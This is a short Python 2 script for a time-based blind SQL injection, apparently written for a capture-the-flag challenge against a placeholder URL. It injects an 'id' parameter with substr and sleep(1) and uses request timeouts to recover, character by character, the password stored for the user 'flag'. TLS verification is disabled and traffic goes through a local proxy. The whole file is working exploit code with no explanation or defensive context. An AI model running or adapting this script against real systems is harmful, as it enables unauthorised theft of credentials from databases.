#!/usr/bin/env python
#
# Time based SQL injection
#
import requests
import warnings
import time

warnings.filterwarnings("ignore")

sqlflag=""

for pos in xrange(1,37): # uuid
    print "Guessing on index: " + str(pos)
    for c in 'abcdef0123456789-':
        print "Guessin on: " + c
        try:
            r = requests.get(
                "https://foo/bar.php", verify=False,
                cookies={"SESSION":"sla9hf99rrkb8eh2l1q4pnjqc0"},
                proxies={"https":"http://127.0.0.1:8080"},
                params={"id":"(1 and if(substr((select password from users where username='flag'),"+str(pos)+",1)='"+c+"', sleep(1), 'false'))"},
                timeout=1
            )

        except requests.exceptions.ReadTimeout:
            print "Found char: " + c
            time.sleep(4)
            sqlflag += c
            break

print sqlflag
